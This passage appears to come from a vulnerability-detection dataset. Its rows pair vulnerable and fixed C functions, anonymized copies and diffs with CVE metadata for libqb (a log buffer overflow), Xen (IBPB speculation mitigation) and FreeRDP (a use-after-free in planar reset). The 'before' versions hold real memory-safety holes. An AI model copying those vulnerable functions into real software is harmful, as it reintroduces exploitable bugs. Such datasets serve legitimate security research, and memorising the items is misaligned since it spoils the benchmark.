max_size = actual_size + t->max_line_length;
chunk = qb_rb_chunk_alloc(t->instance, max_size);
if (chunk == NULL) {
qb_util_perror(LOG_ERR, ""Blackbox allocation error, aborting blackbox log %s"", t->filename);
qb_rb_close(qb_rb_lastref_and_ret(
(struct qb_ringbuffer_s **) &t->instance
));
return;
}
memcpy(chunk, &cs->lineno, sizeof(uint32_t));
chunk += sizeof(uint32_t);
memcpy(chunk, &cs->tags, sizeof(uint32_t));
chunk += sizeof(uint32_t);
memcpy(chunk, &cs->priority, sizeof(uint8_t));
chunk += sizeof(uint8_t);
memcpy(chunk, &fn_size, sizeof(uint32_t));
chunk += sizeof(uint32_t);
memcpy(chunk, cs->function, fn_size);
chunk += fn_size;
memcpy(chunk, timestamp, sizeof(struct timespec));
chunk += sizeof(struct timespec);
msg_len_pt = chunk;
chunk += sizeof(uint32_t);
msg_len = qb_vsnprintf_serialize(chunk, max_size, cs->format, ap);
if (msg_len >= max_size) {
chunk = msg_len_pt + sizeof(uint32_t); 
msg_len = qb_vsnprintf_serialize(chunk, QB_LOG_MAX_LEN,
""Log message too long to be stored in the blackbox.  ""\
""Maximum is QB_LOG_MAX_LEN"" , ap);
}
actual_size += msg_len;
memcpy(msg_len_pt, &msg_len, sizeof(uint32_t));
(void)qb_rb_chunk_commit(t->instance, actual_size);
}","static void
_blackbox_vlogger(int32_t VAR_0,
struct qb_log_callsite *VAR_1, struct timespec *VAR_2, va_list VAR_3)
{
size_t VAR_4;
size_t VAR_5;
uint32_t VAR_6;
char *VAR_7;
char *VAR_8;
uint32_t VAR_9;
struct qb_log_target *VAR_10 = qb_log_target_get(VAR_0);
if (VAR_10->instance == NULL) {
return;
}
VAR_6 = strlen(VAR_1->function) + 1;
VAR_5 = 4 * sizeof(uint32_t) + sizeof(uint8_t) + VAR_6 + sizeof(struct timespec);
VAR_4 = VAR_5 + VAR_10->max_line_length;
VAR_7 = qb_rb_chunk_alloc(VAR_10->instance, VAR_4);
if (VAR_7 == NULL) {
qb_util_perror(VAR_11, ""Blackbox allocation error, aborting blackbox log %s"", VAR_10->filename);
qb_rb_close(qb_rb_lastref_and_ret(
(struct qb_ringbuffer_s **) &VAR_10->instance
));
return;
}
memcpy(VAR_7, &VAR_1->lineno, sizeof(uint32_t));
VAR_7 += sizeof(uint32_t);
memcpy(VAR_7, &VAR_1->tags, sizeof(uint32_t));
VAR_7 += sizeof(uint32_t);
memcpy(VAR_7, &VAR_1->priority, sizeof(uint8_t));
VAR_7 += sizeof(uint8_t);
memcpy(VAR_7, &VAR_6, sizeof(uint32_t));
VAR_7 += sizeof(uint32_t);
memcpy(VAR_7, VAR_1->function, VAR_6);
VAR_7 += VAR_6;
memcpy(VAR_7, VAR_2, sizeof(struct timespec));
VAR_7 += sizeof(struct timespec);
VAR_8 = VAR_7;
VAR_7 += sizeof(uint32_t);
VAR_9 = qb_vsnprintf_serialize(VAR_7, VAR_4, VAR_1->format, VAR_3);
if (VAR_9 >= VAR_4) {
VAR_7 = VAR_8 + sizeof(uint32_t); 
VAR_9 = qb_vsnprintf_serialize(VAR_7, VAR_12,
""Log message too long to be stored in the blackbox.  ""\
""Maximum is QB_LOG_MAX_LEN"" , VAR_3);
}
VAR_5 += VAR_9;
memcpy(VAR_8, &VAR_9, sizeof(uint32_t));
(void)qb_rb_chunk_commit(VAR_10->instance, VAR_5);
}",ClusterLabs/libqb/1bbaa929b77113532785c408dd1b41cd0521ffc8/log_blackbox.c/vul/before/0.json,"static void
_blackbox_vlogger(int32_t target,
		  struct qb_log_callsite *cs, struct timespec *timestamp, va_list ap)
{
	size_t max_size;
	size_t actual_size;
	uint32_t fn_size;
	char *chunk;
	char *msg_len_pt;
	uint32_t msg_len;
	struct qb_log_target *t = qb_log_target_get(target);

	if (t->instance == NULL) {
		return;
	}

	fn_size = strlen(cs->function) + 1;

	actual_size = 4 * sizeof(uint32_t) + sizeof(uint8_t) + fn_size + sizeof(struct timespec);
	max_size = actual_size + t->max_line_length;

	chunk = qb_rb_chunk_alloc(t->instance, max_size);

	if (chunk == NULL) {
		/* something bad has happened. abort blackbox logging */
		qb_util_perror(LOG_ERR, ""Blackbox allocation error, aborting blackbox log %s"", t->filename);
		qb_rb_close(qb_rb_lastref_and_ret(
			(struct qb_ringbuffer_s **) &t->instance
		));
		return;
	}

	/* line number */
	memcpy(chunk, &cs->lineno, sizeof(uint32_t));
	chunk += sizeof(uint32_t);

	/* tags */
	memcpy(chunk, &cs->tags, sizeof(uint32_t));
	chunk += sizeof(uint32_t);

	/* log level/priority */
	memcpy(chunk, &cs->priority, sizeof(uint8_t));
	chunk += sizeof(uint8_t);

	/* function name */
	memcpy(chunk, &fn_size, sizeof(uint32_t));
	chunk += sizeof(uint32_t);
	memcpy(chunk, cs->function, fn_size);
	chunk += fn_size;

	/* timestamp */
	memcpy(chunk, timestamp, sizeof(struct timespec));
	chunk += sizeof(struct timespec);

	/* log message length */
	msg_len_pt = chunk;
	chunk += sizeof(uint32_t);

	/* log message */
	msg_len = qb_vsnprintf_serialize(chunk, t->max_line_length, cs->format, ap);
	if (msg_len >= t->max_line_length) {
	    chunk = msg_len_pt + sizeof(uint32_t); /* Reset */

	    /* Leave this at QB_LOG_MAX_LEN so as not to overflow the blackbox */
	    msg_len = qb_vsnprintf_serialize(chunk, QB_LOG_MAX_LEN,
		""Log message too long to be stored in the blackbox.  ""\
		""Maximum is QB_LOG_MAX_LEN"" , ap);
	}

	actual_size += msg_len;

	/* now that we know the length, write it
	 */
	memcpy(msg_len_pt, &msg_len, sizeof(uint32_t));

	(void)qb_rb_chunk_commit(t->instance, actual_size);
}","static void
_blackbox_vlogger(int32_t VAR_0,
		  struct qb_log_callsite *VAR_1, struct timespec *VAR_2, va_list VAR_3)
{
	size_t VAR_4;
	size_t VAR_5;
	uint32_t VAR_6;
	char *VAR_7;
	char *VAR_8;
	uint32_t VAR_9;
	struct qb_log_target *VAR_10 = qb_log_target_get(VAR_0);

	if (VAR_10->instance == NULL) {
		return;
	}

	VAR_6 = strlen(VAR_1->function) + 1;

	VAR_5 = 4 * sizeof(uint32_t) + sizeof(uint8_t) + VAR_6 + sizeof(struct timespec);
	VAR_4 = VAR_5 + VAR_10->max_line_length;

	VAR_7 = qb_rb_chunk_alloc(VAR_10->instance, VAR_4);

	if (VAR_7 == NULL) {
		/* COMMENT_0 */
		qb_util_perror(VAR_11, ""Blackbox allocation error, aborting blackbox log %s"", VAR_10->filename);
		qb_rb_close(qb_rb_lastref_and_ret(
			(struct qb_ringbuffer_s **) &VAR_10->instance
		));
		return;
	}

	/* COMMENT_1 */
	memcpy(VAR_7, &VAR_1->lineno, sizeof(uint32_t));
	VAR_7 += sizeof(uint32_t);

	/* COMMENT_2 */
	memcpy(VAR_7, &VAR_1->tags, sizeof(uint32_t));
	VAR_7 += sizeof(uint32_t);

	/* COMMENT_3 */
	memcpy(VAR_7, &VAR_1->priority, sizeof(uint8_t));
	VAR_7 += sizeof(uint8_t);

	/* COMMENT_4 */
	memcpy(VAR_7, &VAR_6, sizeof(uint32_t));
	VAR_7 += sizeof(uint32_t);
	memcpy(VAR_7, VAR_1->function, VAR_6);
	VAR_7 += VAR_6;

	/* COMMENT_5 */
	memcpy(VAR_7, VAR_2, sizeof(struct timespec));
	VAR_7 += sizeof(struct timespec);

	/* COMMENT_6 */
	VAR_8 = VAR_7;
	VAR_7 += sizeof(uint32_t);

	/* COMMENT_7 */
	VAR_9 = qb_vsnprintf_serialize(VAR_7, VAR_10->max_line_length, VAR_1->format, VAR_3);
	if (VAR_9 >= VAR_10->max_line_length) {
	    VAR_7 = VAR_8 + sizeof(uint32_t); /* COMMENT_8 */

	    /* COMMENT_9 */
	    VAR_9 = qb_vsnprintf_serialize(VAR_7, VAR_12,
		""Log message too long to be stored in the blackbox.  ""\
		""Maximum is QB_LOG_MAX_LEN"" , VAR_3);
	}

	VAR_5 += VAR_9;

	/* COMMENT_10 */
    
	memcpy(VAR_8, &VAR_9, sizeof(uint32_t));

	(void)qb_rb_chunk_commit(VAR_10->instance, VAR_5);
}",ClusterLabs/libqb/1bbaa929b77113532785c408dd1b41cd0521ffc8/log_blackbox.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -57,8 +57,8 @@
 	chunk += sizeof(uint32_t);
 
 	/* log message */
-	msg_len = qb_vsnprintf_serialize(chunk, max_size, cs->format, ap);
-	if (msg_len >= max_size) {
+	msg_len = qb_vsnprintf_serialize(chunk, t->max_line_length, cs->format, ap);
+	if (msg_len >= t->max_line_length) {
 	    chunk = msg_len_pt + sizeof(uint32_t); /* Reset */
 
 	    /* Leave this at QB_LOG_MAX_LEN so as not to overflow the blackbox */","{'deleted_lines': ['\tmsg_len = qb_vsnprintf_serialize(chunk, max_size, cs->format, ap);', '\tif (msg_len >= max_size) {'], 'added_lines': ['\tmsg_len = qb_vsnprintf_serialize(chunk, t->max_line_length, cs->format, ap);', '\tif (msg_len >= t->max_line_length) {']}",True,log_blackbox.c in libqb before 2.0.8 allows a buffer overflow via long log messages because the header size is not considered.,9.8,CRITICAL,3,valid,2023-07-20T06:19:01Z,4
CVE-2023-20569,['CWE-203'],CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:N/A:N,1,xen-project/xen,"x86/spec-ctrl: Rework ibpb_calculations()

... in order to make the SRSO mitigations easier to integrate.

 * Check for AMD/Hygon CPUs directly, rather than assuming based on IBPB.
   In particular, Xen supports synthesising the IBPB bit to guests on Intel to
   allow IBPB while dissuading the use of (legacy) IBRS.
 * Collect def_ibpb_entry rather than opencoding the BTC_NO calculation for
   both opt_ibpb_entry_{pv,hvm}.

No functional change.

This is part of XSA-434 / CVE-2023-20569

Signed-off-by: Andrew Cooper <andrew.cooper3@citrix.com>
Reviewed-by: Jan Beulich <jbeulich@suse.com>
Reviewed-by: Roger Pau Monn <roger.pau@citrix.com>",292f68fb77196a35ac92b296792770d0f3190d75,https://github.com/xen-project/xen/commit/292f68fb77196a35ac92b296792770d0f3190d75,xen/arch/x86/spec_ctrl.c,ibpb_calculations,"static void __init ibpb_calculations(void)
{
if ( !boot_cpu_has(X86_FEATURE_IBRSB) && !boot_cpu_has(X86_FEATURE_IBPB) )
{
opt_ibpb_entry_hvm = opt_ibpb_entry_pv = opt_ibpb_ctxt_switch = 0;
opt_ibpb_entry_dom0 = false;
return;
}
if ( boot_cpu_has(X86_FEATURE_IBPB) && !boot_cpu_has(X86_FEATURE_IBPB_RET) )
setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);
if ( opt_ibpb_entry_pv == -1 )
opt_ibpb_entry_pv = (IS_ENABLED(CONFIG_PV) &&
boot_cpu_has(X86_FEATURE_IBPB) &&
!boot_cpu_has(X86_FEATURE_BTC_NO));
if ( opt_ibpb_entry_hvm == -1 )
opt_ibpb_entry_hvm = (IS_ENABLED(CONFIG_HVM) &&
boot_cpu_has(X86_FEATURE_IBPB) &&
!boot_cpu_has(X86_FEATURE_BTC_NO));
if ( opt_ibpb_entry_pv )
{
setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_PV);
default_spec_ctrl_flags |= SCF_ist_ibpb;
}
if ( opt_ibpb_entry_hvm )
setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_HVM);
if ( opt_ibpb_ctxt_switch == -1 )
opt_ibpb_ctxt_switch = !(opt_ibpb_entry_hvm && opt_ibpb_entry_pv);
}","static void __init ibpb_calculations(void)
{
if ( !boot_cpu_has(VAR_0) && !boot_cpu_has(VAR_1) )
{
VAR_2 = VAR_3 = VAR_4 = 0;
VAR_5 = false;
return;
}
if ( boot_cpu_has(VAR_1) && !boot_cpu_has(VAR_6) )
setup_force_cpu_cap(VAR_7);
if ( VAR_3 == -1 )
VAR_3 = (IS_ENABLED(VAR_8) &&
boot_cpu_has(VAR_1) &&
!boot_cpu_has(VAR_9));
if ( VAR_2 == -1 )
VAR_2 = (IS_ENABLED(VAR_10) &&
boot_cpu_has(VAR_1) &&
!boot_cpu_has(VAR_9));
if ( VAR_3 )
{
setup_force_cpu_cap(VAR_11);
VAR_12 |= VAR_13;
}
if ( VAR_2 )
setup_force_cpu_cap(VAR_14);
if ( VAR_4 == -1 )
VAR_4 = !(VAR_2 && VAR_3);
}",,"static void __init ibpb_calculations(void)
{
    bool def_ibpb_entry = false;

    /* Check we have hardware IBPB support before using it... */
    if ( !boot_cpu_has(X86_FEATURE_IBRSB) && !boot_cpu_has(X86_FEATURE_IBPB) )
    {
        opt_ibpb_entry_hvm = opt_ibpb_entry_pv = opt_ibpb_ctxt_switch = 0;
        opt_ibpb_entry_dom0 = false;
        return;
    }

    if ( boot_cpu_data.x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON) )
    {
        /*
         * AMD/Hygon CPUs to date (June 2022) don't flush the RAS.  Future
         * CPUs are expected to enumerate IBPB_RET when this has been fixed.
         * Until then, cover the difference with the software sequence.
         */
        if ( !boot_cpu_has(X86_FEATURE_IBPB_RET) )
            setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);

        /*
         * AMD/Hygon CPUs up to and including Zen2 suffer from Branch Type
         * Confusion.  Mitigate with IBPB-on-entry.
         */
        if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )
            def_ibpb_entry = true;
    }

    if ( opt_ibpb_entry_pv == -1 )
        opt_ibpb_entry_pv = IS_ENABLED(CONFIG_PV) && def_ibpb_entry;
    if ( opt_ibpb_entry_hvm == -1 )
        opt_ibpb_entry_hvm = IS_ENABLED(CONFIG_HVM) && def_ibpb_entry;

    if ( opt_ibpb_entry_pv )
    {
        setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_PV);

        /*
         * We only need to flush in IST context if we're protecting against PV
         * guests.  HVM IBPB-on-entry protections are both atomic with
         * NMI/#MC, so can't interrupt Xen ahead of having already flushed the
         * BTB.
         */
        default_spec_ctrl_flags |= SCF_ist_ibpb;
    }
    if ( opt_ibpb_entry_hvm )
        setup_force_cpu_cap(X86_FEATURE_IBPB_ENTRY_HVM);

    /*
     * If we're using IBPB-on-entry to protect against PV and HVM guests
     * (ignoring dom0 if trusted), then there's no need to also issue IBPB on
     * context switch too.
     */
    if ( opt_ibpb_ctxt_switch == -1 )
        opt_ibpb_ctxt_switch = !(opt_ibpb_entry_hvm && opt_ibpb_entry_pv);
}","static void __init ibpb_calculations(void)
{
    bool VAR_0 = false;

    /* COMMENT_0 */
    if ( !boot_cpu_has(VAR_1) && !boot_cpu_has(VAR_2) )
    {
        VAR_3 = VAR_4 = VAR_5 = 0;
        VAR_6 = false;
        return;
    }

    if ( VAR_7.x86_vendor & (VAR_8 | VAR_9) )
    {
        /* COMMENT_1 */
                                                                          
                                                                            
                                                                       
           
        if ( !boot_cpu_has(VAR_10) )
            setup_force_cpu_cap(VAR_11);

        /* COMMENT_6 */
                                                                          
                                                   
           
        if ( !boot_cpu_has(VAR_12) )
            VAR_0 = true;
    }

    if ( VAR_4 == -1 )
        VAR_4 = IS_ENABLED(VAR_13) && VAR_0;
    if ( VAR_3 == -1 )
        VAR_3 = IS_ENABLED(VAR_14) && VAR_0;

    if ( VAR_4 )
    {
        setup_force_cpu_cap(VAR_15);

        /* COMMENT_10 */
                                                                              
                                                                      
                                                                              
               
           
        VAR_16 |= VAR_17;
    }
    if ( VAR_3 )
        setup_force_cpu_cap(VAR_18);

    /* COMMENT_16 */
                                                                        
                                                                             
                          
       
    if ( VAR_5 == -1 )
        VAR_5 = !(VAR_3 && VAR_4);
}",,"--- func_before
+++ func_after
@@ -1,5 +1,7 @@
 static void __init ibpb_calculations(void)
 {
+    bool def_ibpb_entry = false;
+
     /* Check we have hardware IBPB support before using it... */
     if ( !boot_cpu_has(X86_FEATURE_IBRSB) && !boot_cpu_has(X86_FEATURE_IBPB) )
     {
@@ -8,28 +10,28 @@
         return;
     }
 
-    /*
-     * AMD/Hygon CPUs to date (June 2022) don't flush the the RAS.  Future
-     * CPUs are expected to enumerate IBPB_RET when this has been fixed.
-     * Until then, cover the difference with the software sequence.
-     */
-    if ( boot_cpu_has(X86_FEATURE_IBPB) && !boot_cpu_has(X86_FEATURE_IBPB_RET) )
-        setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);
+    if ( boot_cpu_data.x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON) )
+    {
+        /*
+         * AMD/Hygon CPUs to date (June 2022) don't flush the RAS.  Future
+         * CPUs are expected to enumerate IBPB_RET when this has been fixed.
+         * Until then, cover the difference with the software sequence.
+         */
+        if ( !boot_cpu_has(X86_FEATURE_IBPB_RET) )
+            setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);
 
-    /*
-     * IBPB-on-entry mitigations for Branch Type Confusion.
-     *
-     * IBPB && !BTC_NO selects all AMD/Hygon hardware, not known to be safe,
-     * that we can provide some form of mitigation on.
-     */
+        /*
+         * AMD/Hygon CPUs up to and including Zen2 suffer from Branch Type
+         * Confusion.  Mitigate with IBPB-on-entry.
+         */
+        if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )
+            def_ibpb_entry = true;
+    }
+
     if ( opt_ibpb_entry_pv == -1 )
-        opt_ibpb_entry_pv = (IS_ENABLED(CONFIG_PV) &&
-                             boot_cpu_has(X86_FEATURE_IBPB) &&
-                             !boot_cpu_has(X86_FEATURE_BTC_NO));
+        opt_ibpb_entry_pv = IS_ENABLED(CONFIG_PV) && def_ibpb_entry;
     if ( opt_ibpb_entry_hvm == -1 )
-        opt_ibpb_entry_hvm = (IS_ENABLED(CONFIG_HVM) &&
-                              boot_cpu_has(X86_FEATURE_IBPB) &&
-                              !boot_cpu_has(X86_FEATURE_BTC_NO));
+        opt_ibpb_entry_hvm = IS_ENABLED(CONFIG_HVM) && def_ibpb_entry;
 
     if ( opt_ibpb_entry_pv )
     {","{'deleted_lines': ['    /*', ""     * AMD/Hygon CPUs to date (June 2022) don't flush the the RAS.  Future"", '     * CPUs are expected to enumerate IBPB_RET when this has been fixed.', '     * Until then, cover the difference with the software sequence.', '     */', '    if ( boot_cpu_has(X86_FEATURE_IBPB) && !boot_cpu_has(X86_FEATURE_IBPB_RET) )', '        setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);', '    /*', '     * IBPB-on-entry mitigations for Branch Type Confusion.', '     *', '     * IBPB && !BTC_NO selects all AMD/Hygon hardware, not known to be safe,', '     * that we can provide some form of mitigation on.', '     */', '        opt_ibpb_entry_pv = (IS_ENABLED(CONFIG_PV) &&', '                             boot_cpu_has(X86_FEATURE_IBPB) &&', '                             !boot_cpu_has(X86_FEATURE_BTC_NO));', '        opt_ibpb_entry_hvm = (IS_ENABLED(CONFIG_HVM) &&', '                              boot_cpu_has(X86_FEATURE_IBPB) &&', '                              !boot_cpu_has(X86_FEATURE_BTC_NO));'], 'added_lines': ['    bool def_ibpb_entry = false;', '', '    if ( boot_cpu_data.x86_vendor & (X86_VENDOR_AMD | X86_VENDOR_HYGON) )', '    {', '        /*', ""         * AMD/Hygon CPUs to date (June 2022) don't flush the RAS.  Future"", '         * CPUs are expected to enumerate IBPB_RET when this has been fixed.', '         * Until then, cover the difference with the software sequence.', '         */', '        if ( !boot_cpu_has(X86_FEATURE_IBPB_RET) )', '            setup_force_cpu_cap(X86_BUG_IBPB_NO_RET);', '        /*', '         * AMD/Hygon CPUs up to and including Zen2 suffer from Branch Type', '         * Confusion.  Mitigate with IBPB-on-entry.', '         */', '        if ( !boot_cpu_has(X86_FEATURE_BTC_NO) )', '            def_ibpb_entry = true;', '    }', '', '        opt_ibpb_entry_pv = IS_ENABLED(CONFIG_PV) && def_ibpb_entry;', '        opt_ibpb_entry_hvm = IS_ENABLED(CONFIG_HVM) && def_ibpb_entry;']}",True,"


A side channel vulnerability on some of the AMD CPUs may allow an attacker to influence the return address prediction. This may result in speculative execution at an attacker-controlledaddress, potentially leading to information disclosure.



















",4.7,MEDIUM,1,valid,2023-07-27T19:03:28Z,4
CVE-2023-39355,['CWE-416'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H,1,FreeRDP,"[codec,planar] fix reset",d6f9d33a7db0b346195b6a15b5b99944ba41beee,https://github.com/FreeRDP/FreeRDP/commit/d6f9d33a7db0b346195b6a15b5b99944ba41beee,libfreerdp/codec/planar.c,freerdp_bitmap_planar_context_reset,"BOOL freerdp_bitmap_planar_context_reset(BITMAP_PLANAR_CONTEXT* context, UINT32 width,
UINT32 height)
{
if (!context)
return FALSE;
context->bgr = FALSE;
context->maxWidth = PLANAR_ALIGN(width, 4);
context->maxHeight = PLANAR_ALIGN(height, 4);
context->maxPlaneSize = context->maxWidth * context->maxHeight;
context->nTempStep = context->maxWidth * 4;
void* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);
if (!tmp)
return FALSE;
context->planesBuffer = tmp;
tmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);
if (!tmp)
return FALSE;
context->pTempData = tmp;
tmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);
if (!tmp)
return FALSE;
context->deltaPlanesBuffer = tmp;
tmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);
if (!tmp)
return FALSE;
context->rlePlanesBuffer = tmp;
context->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];
context->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];
context->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];
context->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];
context->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];
context->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];
context->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];
context->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];
return TRUE;
}","BOOL freerdp_bitmap_planar_context_reset(BITMAP_PLANAR_CONTEXT* VAR_0, UINT32 VAR_1,
UINT32 VAR_2)
{
if (!VAR_0)
return FALSE;
VAR_0->bgr = FALSE;
VAR_0->maxWidth = PLANAR_ALIGN(VAR_1, 4);
VAR_0->maxHeight = PLANAR_ALIGN(VAR_2, 4);
VAR_0->maxPlaneSize = VAR_0->maxWidth * VAR_0->maxHeight;
VAR_0->nTempStep = VAR_0->maxWidth * 4;
void* VAR_3 = winpr_aligned_recalloc(VAR_0->planesBuffer, VAR_0->maxPlaneSize, 4, 32);
if (!VAR_3)
return FALSE;
VAR_0->planesBuffer = VAR_3;
VAR_3 = winpr_aligned_recalloc(VAR_0->pTempData, VAR_0->maxPlaneSize, 6, 32);
if (!VAR_3)
return FALSE;
VAR_0->pTempData = VAR_3;
VAR_3 = winpr_aligned_recalloc(VAR_0->deltaPlanesBuffer, VAR_0->maxPlaneSize, 4, 32);
if (!VAR_3)
return FALSE;
VAR_0->deltaPlanesBuffer = VAR_3;
VAR_3 = winpr_aligned_recalloc(VAR_0->rlePlanesBuffer, VAR_0->maxPlaneSize, 4, 32);
if (!VAR_3)
return FALSE;
VAR_0->rlePlanesBuffer = VAR_3;
VAR_0->planes[0] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 0];
VAR_0->planes[1] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 1];
VAR_0->planes[2] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 2];
VAR_0->planes[3] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 3];
VAR_0->deltaPlanes[0] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 0];
VAR_0->deltaPlanes[1] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 1];
VAR_0->deltaPlanes[2] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 2];
VAR_0->deltaPlanes[3] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 3];
return TRUE;
}",FreeRDP/d6f9d33a7db0b346195b6a15b5b99944ba41beee/planar.c/vul/before/1.json,"BOOL freerdp_bitmap_planar_context_reset(BITMAP_PLANAR_CONTEXT* context, UINT32 width,
                                         UINT32 height)
{
	if (!context)
		return FALSE;

	context->bgr = FALSE;
	context->maxWidth = PLANAR_ALIGN(width, 4);
	context->maxHeight = PLANAR_ALIGN(height, 4);
	context->maxPlaneSize = context->maxWidth * context->maxHeight;
	context->nTempStep = context->maxWidth * 4;

	memset(context->planes, 0, sizeof(context->planes));
	memset(context->rlePlanes, 0, sizeof(context->rlePlanes));
	memset(context->deltaPlanes, 0, sizeof(context->deltaPlanes));

	if (context->maxPlaneSize > 0)
	{
		void* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);
		if (!tmp)
			return FALSE;
		context->planesBuffer = tmp;

		tmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);
		if (!tmp)
			return FALSE;
		context->pTempData = tmp;

		tmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);
		if (!tmp)
			return FALSE;
		context->deltaPlanesBuffer = tmp;

		tmp = winpr_aligned_recalloc(context->rlePlanesBuffer, context->maxPlaneSize, 4, 32);
		if (!tmp)
			return FALSE;
		context->rlePlanesBuffer = tmp;

		context->planes[0] = &context->planesBuffer[context->maxPlaneSize * 0];
		context->planes[1] = &context->planesBuffer[context->maxPlaneSize * 1];
		context->planes[2] = &context->planesBuffer[context->maxPlaneSize * 2];
		context->planes[3] = &context->planesBuffer[context->maxPlaneSize * 3];
		context->deltaPlanes[0] = &context->deltaPlanesBuffer[context->maxPlaneSize * 0];
		context->deltaPlanes[1] = &context->deltaPlanesBuffer[context->maxPlaneSize * 1];
		context->deltaPlanes[2] = &context->deltaPlanesBuffer[context->maxPlaneSize * 2];
		context->deltaPlanes[3] = &context->deltaPlanesBuffer[context->maxPlaneSize * 3];
	}
	return TRUE;
}","BOOL freerdp_bitmap_planar_context_reset(BITMAP_PLANAR_CONTEXT* VAR_0, UINT32 VAR_1,
                                         UINT32 VAR_2)
{
	if (!VAR_0)
		return FALSE;

	VAR_0->bgr = FALSE;
	VAR_0->maxWidth = PLANAR_ALIGN(VAR_1, 4);
	VAR_0->maxHeight = PLANAR_ALIGN(VAR_2, 4);
	VAR_0->maxPlaneSize = VAR_0->maxWidth * VAR_0->maxHeight;
	VAR_0->nTempStep = VAR_0->maxWidth * 4;

	memset(VAR_0->planes, 0, sizeof(VAR_0->planes));
	memset(VAR_0->rlePlanes, 0, sizeof(VAR_0->rlePlanes));
	memset(VAR_0->deltaPlanes, 0, sizeof(VAR_0->deltaPlanes));

	if (VAR_0->maxPlaneSize > 0)
	{
		void* VAR_3 = winpr_aligned_recalloc(VAR_0->planesBuffer, VAR_0->maxPlaneSize, 4, 32);
		if (!VAR_3)
			return FALSE;
		VAR_0->planesBuffer = VAR_3;

		VAR_3 = winpr_aligned_recalloc(VAR_0->pTempData, VAR_0->maxPlaneSize, 6, 32);
		if (!VAR_3)
			return FALSE;
		VAR_0->pTempData = VAR_3;

		VAR_3 = winpr_aligned_recalloc(VAR_0->deltaPlanesBuffer, VAR_0->maxPlaneSize, 4, 32);
		if (!VAR_3)
			return FALSE;
		VAR_0->deltaPlanesBuffer = VAR_3;

		VAR_3 = winpr_aligned_recalloc(VAR_0->rlePlanesBuffer, VAR_0->maxPlaneSize, 4, 32);
		if (!VAR_3)
			return FALSE;
		VAR_0->rlePlanesBuffer = VAR_3;

		VAR_0->planes[0] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 0];
		VAR_0->planes[1] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 1];
		VAR_0->planes[2] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 2];
		VAR_0->planes[3] = &VAR_0->planesBuffer[VAR_0->maxPlaneSize * 3];
		VAR_0->deltaPlanes[0] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 0];
		VAR_0->deltaPlanes[1] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 1];
		VAR_0->deltaPlanes[2] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 2];
		VAR_0->deltaPlanes[3] = &VAR_0->deltaPlanesBuffer[VAR_0->maxPlaneSize * 3];
	}
	return TRUE;
}",FreeRDP/d6f9d33a7db0b346195b6a15b5b99944ba41beee/planar.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -10,33 +10,40 @@
 	context->maxPlaneSize = context->maxWidth * context->maxHeight;
 	context->nTempStep = context->maxWidth * 4;
 
-	void* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);
-	if (!tmp)
-		return FALSE;
-	context->planesBuffer = tmp;
+	memset(context->planes, 0, sizeof(context->planes));
+	memset(context->rlePlanes, 0, sizeof(context->rlePlanes));
+	memset(context->deltaPlanes, 0, sizeof(context->deltaPlanes));
 
-	tmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);
-	if (!tmp)
-		return FALSE;
-	context->pTempData = tmp;
+	if (context->maxPlaneSize > 0)
+	{
+		void* tmp = winpr_aligned_recalloc(context->planesBuffer, context->maxPlaneSize, 4, 32);
+		if (!tmp)
+			return FALSE;
+		context->planesBuffer = tmp;
 
-	tmp = winpr_aligned_recalloc(context->deltaPlanesBuffer, context->maxPlaneSize, 4, 32);
-	if (!tmp)
-		return FALSE;
-	context->deltaPlanesBuffer = tmp;
+		tmp = winpr_aligned_recalloc(context->pTempData, context->maxPlaneSize, 6, 32);
+		if (!tmp)
+			return FALSE;
+		context->pTempData = tmp;
 
